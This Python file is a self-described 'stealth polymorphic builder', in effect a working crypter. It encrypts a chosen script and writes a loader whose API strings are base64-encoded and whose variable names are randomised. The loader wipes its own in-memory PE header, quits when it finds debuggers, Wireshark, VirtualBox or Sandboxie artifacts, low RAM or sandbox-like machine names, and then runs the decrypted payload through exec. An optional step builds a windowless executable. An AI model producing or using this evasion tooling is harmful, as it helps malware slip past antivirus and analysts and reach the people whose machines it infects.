import os
import sys
import base64
import hashlib
import zlib
import secrets
import subprocess
import re
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

def rnd():
    return f"_v_{secrets.token_hex(8)}"

def analyze_and_inject_imports(source_code_bytes):
    try:
        code_str = source_code_bytes.decode('utf-8', errors='ignore')
    except Exception:
        code_str = ""
    found_imports = set(re.findall(r'^\s*(?:import|from)\s+([a-zA-Z0-9_]+)', code_str, re.MULTILINE))
    mandatory_modules = {"os", "sys", "time", "base64", "hashlib", "ctypes", "zlib", "secrets"}
    return list(mandatory_modules.union(found_imports))

def protect_user_script():
    print("==================================================")
    print("   STEALTH POLYMORPHIC BUILDER + OPTIONAL EXE     ")
    print("==================================================")

    target_file = input("[?] Target script filename (default: main.py): ").strip()
    if not target_file:
        target_file = "main.py"

    if not os.path.exists(target_file):
        print(f"[!] Error: File '{target_file}' not found!")
        sys.exit(-1)

    output_file = f"protected_{target_file}"

    with open(target_file, "rb") as f:
        raw_code = f.read()

    print("[*] Analyzing target script imports...")
    detected_modules = analyze_and_inject_imports(raw_code)
    print(f"[+] Detected imports/modules to bundle: {', '.join(detected_modules)}")

    print("[*] Compressing and multi-layer encrypting payload...")
    compressed_data = zlib.compress(raw_code, level=9)

    shifted = bytearray()
    for i, b in enumerate(compressed_data):
        m = (b >> 3) & 0xFF
        n = (b << 5) & 0xFF
        shifted.append((((m | n) ^ (i * 19 & 0xFF)) + 7) & 0xFF)
    shifted_bytes = bytes(shifted)

    key = hashlib.sha256(shifted_bytes).digest()
    iv = os.urandom(16)
    
    padder = padding.PKCS7(128).padder()
    padded = padder.update(compressed_data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()

    b64_s = base64.b64encode(shifted_bytes).decode('utf-8')
    b64_c = base64.b64encode(ciphertext).decode('utf-8')
    b64_iv = base64.b64encode(iv).decode('utf-8')

    def enc(s):
        return base64.b64encode(s.encode()).decode()

    k32_e = enc("kernel32")
    gmf_e = enc("GetModuleHandleW")
    vpr_e = enc("VirtualProtect")
    w32_mod = enc("win32api")
    gcp_func = enc("GetCursorPos")
    ps_mod = enc("psutil")
    vm_mem = enc("virtual_memory")
    gcn_func = enc("GetComputerName")

    dbg_list = [enc("x64dbg.exe"), enc("x32dbg.exe"), enc("ida64.exe"), enc("ida.exe"), enc("ollydbg.exe"), enc("wireshark.exe"), enc("x96dbg.exe"), enc("dnspy.exe")]
    art_list = [enc("\\system32\\drivers\\sbiedrv.sys"), enc("\\system32\\drivers\\VBoxMouse.sys"), enc("\\system32\\drivers\\VBoxGuest.sys"), enc("\\system32\\drivers\\vboxservice.exe")]
    vm_names = [enc("virtualbox"), enc("vmware"), enc("vm"), enc("user"), enc("johndoe"), enc("sandbox")]

    v = [rnd() for _ in range(80)]
    imports_string = ", ".join(detected_modules)

    loader_code = f'''import {imports_string}, ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

{v[0]} = lambda x: base64.b64decode(x).decode()
{v[1]} = ["{b64_s}", "{b64_c}", "{b64_iv}"]

def {v[2]}():
    {v[3]} = time.time()
    {v[4]} = 0
    for {v[5]} in range(250000):
        {v[4]} += ({v[5]} * 3) ^ 7
    {v[6]} = time.time()
    if ({v[6]} - {v[3]}) < 0.0001:
        return False
    return True

def {v[7]}():
    try:
        {v[8]} = {v[0]}("{k32_e}")
        {v[9]} = {v[0]}("{gmf_e}")
        {v[10]} = {v[0]}("{vpr_e}")
        {v[11]} = ctypes.WinDLL({v[8]}, use_last_error=True)
        {v[12]} = getattr({v[11]}, {v[9]})(None)
        if {v[12]}:
            {v[13]} = ctypes.c_ulong()
            if getattr({v[11]}, {v[10]})(ctypes.c_void_p({v[12]}), ctypes.c_size_t(4096), 0x40, ctypes.byref({v[13]})):
                ctypes.memset({v[12]}, 0, 512)
                getattr({v[11]}, {v[10]})(ctypes.c_void_p({v[12]}), ctypes.c_size_t(4096), {v[13]}, ctypes.byref({v[13]}))
    except:
        pass
    
    if not {v[2]}():
        return False

    try:
        {v[14]} = __import__({v[0]}("{w32_mod}"))
        {v[15]} = getattr({v[14]}, {v[0]}("{gcp_func}"))
        {v[16]} = 0
        for {v[17]} in range(300):
            {v[18]}, {v[19]} = {v[15]}()
            time.sleep(0.0001)
            {v[20]}, {v[21]} = {v[15]}()
            if abs({v[20]} - {v[18]}) ^ abs({v[21]} - {v[19]}) > 40:
                {v[16]} += 1
        if {v[16]} > 2:
            return False

        {v[22]} = __import__({v[0]}("{ps_mod}"))
        {v[23]} = [{v[0]}(x) for x in {dbg_list}]
        for {v[24]} in {v[22]}.process_iter():
            try:
                if {v[24]}.name().lower() in {v[23]}:
                    return False
            except:
                pass

        {v[25]} = getattr({v[22]}, {v[0]}("{vm_mem}"))
        if ({v[25]}().total / 1024 / 1024) < 3000:
            return False

        {v[26]} = os.environ.get('SystemRoot', 'C:\\\\Windows')
        {v[27]} = [{v[0]}(x) for x in {art_list}]
        for {v[28]} in {v[27]}:
            if os.path.exists({v[26]} + {v[28]}):
                return False

        {v[29]} = getattr({v[14]}, {v[0]}("{gcn_func}"))
        {v[30]} = [{v[0]}(x) for x in {vm_names}]
        if {v[29]}().lower() in {v[30]}:
            return False
    except:
        pass
    return True

if __name__ == "__main__":
    if not {v[7]}():
        time.sleep(1)
        sys.exit(-1)

    try:
        {v[31]} = base64.b64decode({v[1]}[0])
        {v[32]} = bytearray()
        for {v[33]}, {v[34]} in enumerate({v[31]}):
            {v[35]} = {v[34]} - 7
            {v[36]} = (((_k_temp := {v[35]} ^ ({v[33]} * 19 & 0xFF)) >> 5) & 0xFF) | ((_k_temp << 3) & 0xFF)
            {v[32]}.append({v[36]} & 0xFF)
        
        {v[37]} = hashlib.sha256(bytes({v[32]})).digest()
        {v[38]} = base64.b64decode({v[1]}[1])
        {v[39]} = base64.b64decode({v[1]}[2])
        
        {v[40]} = Cipher(algorithms.AES({v[37]}), modes.CBC({v[39]}))
        {v[41]} = {v[40]}.decryptor()
        {v[42]} = {v[41]}.update({v[38]}) + {v[41]}.finalize()
        
        {v[43]} = padding.PKCS7(128).unpadder()
        {v[44]} = {v[43]}.update({v[42]}) + {v[43]}.finalize()
        
        {v[45]} = zlib.decompress({v[44]})
        
        {v[46]} = {{}}
        exec(compile({v[45]}, "<string>", "exec"), {v[46]})
    except Exception as {v[47]}:
        time.sleep(1)
        sys.exit(-1)
'''

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(loader_code)

    print(f"[+] Protected source script generated successfully: '{output_file}'")

    # --- OPSİYONEL EXE DERLEME SORUSU ---
    choice = input("[?] Do you want to compile this script into a standalone .exe using PyInstaller? (y/N): ").strip().lower()
    if choice == 'y':
        print("[*] Starting PyInstaller compilation for Python 3.14...")
        try:
            build_args = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--clean", output_file]
            subprocess.run(build_args, check=True)
            print("[+] SUCCESS! Standalone executable compiled inside the 'dist/' folder!")
        except subprocess.CalledProcessError as e:
            print(f"[!] Compilation failed with error code {e.returncode}")
        except Exception as ex:
            print(f"[!] Error: {ex}")
    else:
        print("[*] Skipping .exe compilation. You can run the protected python script directly.")

if __name__ == "__main__":
    protect_user_script()